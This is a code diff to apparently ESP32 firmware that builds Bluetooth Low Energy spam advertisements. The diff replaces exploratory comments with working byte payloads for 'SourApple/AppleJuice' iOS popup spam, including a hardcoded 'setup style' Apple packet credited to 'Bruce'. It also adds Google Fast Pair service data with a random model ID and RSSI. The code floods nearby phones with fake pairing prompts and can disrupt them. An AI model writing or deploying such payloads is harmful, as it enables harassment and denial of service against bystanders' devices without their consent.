@@ -78,15 +78,6 @@ std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
         case IOS_POPUP: {
             // SourApple / AppleJuice Logic
             // Manufacturer: 0x004C (Apple)
-            // We need to construct the data part of the Manufacturer Data
-            // The library adds the length and type (0xFF) and ID (0x4C 0x00) if we use setManufacturerData?
-            // No, setManufacturerData expects the full data string usually including the ID? 
-            // Let's check standard ESP32 BLE implementation. 
-            // It usually takes the string and prepends length and 0xFF.
-            // But we need to be careful about the ID.
-            
-            // Constructing raw payload for Apple
-            // 0x4C 0x00 (Apple ID) + Data
             
             data.push_back(0x4C);
             data.push_back(0x00);
@@ -101,14 +92,16 @@ std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
                 data.push_back(random(0, 256));
                 data.push_back(random(0, 256));
                 data.push_back(random(0, 256));
-            } else { // Setup style
+            } else { // Setup style (IOS2 from Bruce)
                 uint8_t action = IOS_ACTIONS[random(0, sizeof(IOS_ACTIONS))];
-                data.push_back(0x0C); // Type?
-                data.push_back(0x04); // Length
-                data.push_back(action);
-                data.push_back(random(0, 256));
-                data.push_back(random(0, 256));
-                data.push_back(random(0, 256)); // Just filling randoms
+                // 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, ACTION, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
+                uint8_t payload[] = {
+                    0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 
+                    0x0f, 0x05, 0xc1, 
+                    action, 
+                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
+                };
+                for(uint8_t b : payload) data.push_back(b);
             }
             break;
         }
@@ -116,25 +109,17 @@ std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
         case ANDROID_PAIR: {
             // Google Fast Pair
             // Service UUID: 0xFE2C
-            // We need to set Service Data for 0xFE2C
-            
-            // In this function we are returning a byte array. 
-            // The caller will decide how to use it (Manufacturer Data vs Service Data).
-            // But wait, the caller needs to know WHAT it is.
-            // Let's assume we return just the raw bytes for the specific payload type 
-            // and the caller handles the wrapper.
-            
-            // Actually, for Android it's Service Data.
-            // For iOS it's Manufacturer Data.
-            // We might need a struct return.
-            
-            // For now, let's just return the payload and handle the type in the caller based on the enum.
+            // Data after UUID: Model (3) + 0x02 + 0x0A + RSSI (1)
             
             uint32_t model = ANDROID_MODELS[random(0, sizeof(ANDROID_MODELS)/sizeof(uint32_t))];
             
             data.push_back((model >> 16) & 0xFF);
             data.push_back((model >> 8) & 0xFF);
             data.push_back(model & 0xFF);
+            
+            data.push_back(0x02);
+            data.push_back(0x0A);
+            data.push_back((uint8_t)((random(0, 120)) - 100)); // RSSI
             break;
         }
         
